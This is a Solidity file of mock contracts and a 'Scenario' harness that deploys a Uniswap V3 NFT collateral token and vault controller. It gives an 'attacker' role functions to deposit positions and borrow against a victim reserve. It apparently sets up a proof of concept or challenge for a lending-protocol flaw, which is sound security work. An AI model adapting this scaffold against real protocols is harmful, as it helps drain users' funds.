// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./lending/wrapper/Univ3CollateralToken.sol";
import "./lending/controller/NftVaultController.sol";
import "./lending/IVault.sol";
import "./lending/IVaultController.sol";
import "./_external/uniswap/INonfungiblePositionManager.sol";

contract MockUSD {
    string public name="Mock USD"; string public symbol="mUSD"; uint8 public decimals=18;
    mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    function mint(address to,uint256 a) external { balanceOf[to]+=a; }
    function transfer(address to,uint256 a) external returns(bool){require(balanceOf[msg.sender]>=a,"bal");balanceOf[msg.sender]-=a;balanceOf[to]+=a;return true;}
    function approve(address s,uint256 a) external returns(bool){allowance[msg.sender][s]=a;return true;}
    function transferFrom(address f,address t,uint256 a) external returns(bool){require(balanceOf[f]>=a&&allowance[f][msg.sender]>=a,"allow");allowance[f][msg.sender]-=a;balanceOf[f]-=a;balanceOf[t]+=a;return true;}
}

contract MockPositionManager {
    struct P { address owner; address token0; address token1; uint24 fee; int24 lo; int24 hi; uint128 liq; }
    mapping(uint256=>P) public p; mapping(uint256=>address) public getApproved; uint256 public next=1;
    function mintPosition(address to,uint256 id) external { p[id]=P(to,address(1),address(2),500,-60,60,1e18); if(id>=next)next=id+1; }
    function positions(uint256 id) external view returns(uint96,address,address,address,uint24,int24,int24,uint128,uint256,uint256,uint128,uint128){P memory x=p[id];return(0,address(0),x.token0,x.token1,x.fee,x.lo,x.hi,x.liq,0,0,0,0);}
    function ownerOf(uint256 id) external view returns(address){return p[id].owner;}
    function approve(address to,uint256 id) external {require(msg.sender==p[id].owner,"owner");getApproved[id]=to;}
    function transferFrom(address from,address to,uint256 id) external {_transfer(from,to,id);}
    function _transfer(address from,address to,uint256 id) internal {require(p[id].owner==from&& (msg.sender==from||getApproved[id]==msg.sender),"transfer");p[id].owner=to;getApproved[id]=address(0);}
    function safeTransferFrom(address from,address to,uint256 id) external {_transfer(from,to,id);}
    function safeTransferFrom(address from,address to,uint256 id,bytes calldata) external {_transfer(from,to,id);}
    function balanceOf(address a) external view returns(uint256 n){for(uint i=1;i<next;i++)if(p[i].owner==a)n++;}
    function tokenOfOwnerByIndex(address a,uint256 j) external view returns(uint256 n){uint k;for(uint i=1;i<next;i++)if(p[i].owner==a){if(k++==j)return i;}revert();}
    function collect(INonfungiblePositionManager.CollectParams calldata) external payable returns(uint256,uint256){return(0,0);}
    function burn(uint256) external payable {}
    function multicall(bytes[] calldata) external payable returns(bytes[] memory){return new bytes[](0);}
    function selfPermit(address,uint256,uint256,uint8,bytes32,bytes32) external {}
    function increaseLiquidity(INonfungiblePositionManager.IncreaseLiquidityParams calldata) external payable returns(uint128,uint256,uint256){return(0,0,0);}
    function decreaseLiquidity(INonfungiblePositionManager.DecreaseLiquidityParams calldata) external payable returns(uint256,uint256){return(0,0);}
    function mint(INonfungiblePositionManager.MintParams calldata) external payable returns(uint256,uint128,uint256,uint256){return(0,0,0,0);}
}

contract MockValuator {
    uint256 public immutable value;
    constructor(uint256 v){value=v;}
    function verifyPool(uint256) external pure returns(address,int24,int24,uint128){return(address(1),-60,60,1e18);}
    function getValue(uint256 id) external view returns(uint256){require(id!=0,"id");return value;}
}

contract MockVault {
    uint96 public immutable id; address public immutable minter; address public controller;
    constructor(uint96 i,address m){id=i;minter=m;}
    function baseLiability() external pure returns(uint256){return 0;} function tokenBalance(address) external pure returns(uint256){return 0;}
    function withdrawErc20(address,uint256) external {} function delegateCompLikeTo(address,address) external {} function controllerTransfer(address,address,uint256) external {}
    function modifyLiability(bool,uint256) external pure returns(uint256){return 0;}
}

contract MockVaultController {
    mapping(uint96=>address) public vaults; mapping(address=>uint96) public ids; address public scenario; address public collateral; MockUSD public usd; uint256 public reserve;
    constructor(){scenario=msg.sender;usd=new MockUSD();reserve=1000 ether;usd.mint(address(this),reserve);}
    function setCollateral(address c) external {collateral=c;}
    function setVault(uint96 id,address v) external {vaults[id]=v;ids[v]=id;}
    function vaultAddress(uint96 id) external view returns(address){return vaults[id];}
    function borrowUSDIto(uint96 id,uint192 amount,address target) external {require(msg.sender==scenario,"minter");require(Univ3CollateralToken(collateral).balanceOf(vaults[id])>=amount,"collateral");require(usd.balanceOf(address(this))>=amount,"reserve");usd.transfer(target,amount);}
    function tokensRegistered() external pure returns(uint256){return 0;} function vaultsMinted() external pure returns(uint96){return 2;} function lastInterestTime() external pure returns(uint64){return 0;} function totalBaseLiability() external pure returns(uint192){return 0;} function interestFactor() external pure returns(uint192){return 1e18;} function protocolFee() external pure returns(uint192){return 0;}
    function vaultIDs(address) external pure returns(uint96[] memory x){return x;} function amountToSolvency(uint96) external pure returns(uint256){return 0;} function vaultLiability(uint96) external pure returns(uint192){return 0;} function vaultBorrowingPower(uint96 id) external view returns(uint192){return uint192(Univ3CollateralToken(collateral).balanceOf(vaults[id]));} function tokensToLiquidate(uint96,address) external pure returns(uint256){return 0;} function checkVault(uint96) external pure returns(bool){return true;}
    function vaultSummaries(uint96,uint96) external pure returns(IVaultController.VaultSummary[] memory x){return x;} function calculateInterest() external pure returns(uint256){return 0;} function mintVault() external pure returns(address){return address(0);} function liquidateVault(uint96,address,uint256) external pure returns(uint256){return 0;} function borrowUsdi(uint96,uint192) external {} function borrowUSDCto(uint96,uint192,address) external {} function repayUSDi(uint96,uint192) external {} function repayAllUSDi(uint96) external {} function pause() external {} function unpause() external {} function getOracleMaster() external pure returns(address){return address(0);} function registerOracleMaster(address) external {} function getCurveMaster() external pure returns(address){return address(0);} function registerCurveMaster(address) external {} function changeProtocolFee(uint192) external {} function registerErc20(address,uint256,address,uint256) external {} function registerErc20(address,uint256,address,uint256,uint256) external {} function unregisterErc20(address) external {} function oracleMaster() external pure returns(address){return address(0);} function curveMaster() external pure returns(address){return address(0);} function usdi() external view returns(address){return address(usd);} function reserveAddress() external view returns(address){return address(usd);} function vaultControllerTransfer(address,address,uint256) external {} function vaultControllerBurn(address,uint256) external {} function vaultControllerMint(address,uint256) external {}
}

contract Scenario {
    MockPositionManager public manager; MockValuator public valuator; MockVaultController public controller; NftVaultController public nftController; Univ3CollateralToken public collateral; MockUSD public usd; MockVault public vault1; MockVault public vault2; address public attacker;
    constructor(){
        manager=new MockPositionManager(); valuator=new MockValuator(100 ether); controller=new MockVaultController();
        nftController=new NftVaultController(); nftController.initialize(address(controller));
        collateral=new Univ3CollateralToken(); collateral.initialize("UniV3 Collateral","uV3",address(manager),address(controller),address(nftController),address(valuator));
        nftController.registerUnderlying(address(collateral),address(manager)); controller.setCollateral(address(collateral)); usd=controller.usd();
    }
    function setup(address a) external {require(attacker==address(0),"setup");attacker=a; vault1=new MockVault(1,a);vault2=new MockVault(2,a);controller.setVault(1,address(vault1));controller.setVault(2,address(vault2));nftController.mintVault(1);nftController.mintVault(2);manager.mintPosition(address(this),1);manager.mintPosition(address(this),2);}
    function approvePositions() external {require(msg.sender==attacker,"attacker");manager.approve(address(collateral),1);manager.approve(address(collateral),2);}
    function deposit(uint256 id,uint96 vaultId) external {require(msg.sender==attacker,"attacker");collateral.deposit(id,vaultId);}
    function borrow(uint96 id,uint192 amount) external {require(msg.sender==attacker,"attacker");controller.borrowUSDIto(id,amount,attacker);}
    function victimReserve() external view returns(uint256){return usd.balanceOf(address(controller));}
    function vaultValue(uint96 id) external view returns(uint256){return collateral.balanceOf(id==1?address(vault1):address(vault2));}
    function addresses() external view returns(address,address,address,address,address){return(address(collateral),address(controller),address(vault1),address(vault2),address(usd));}
}
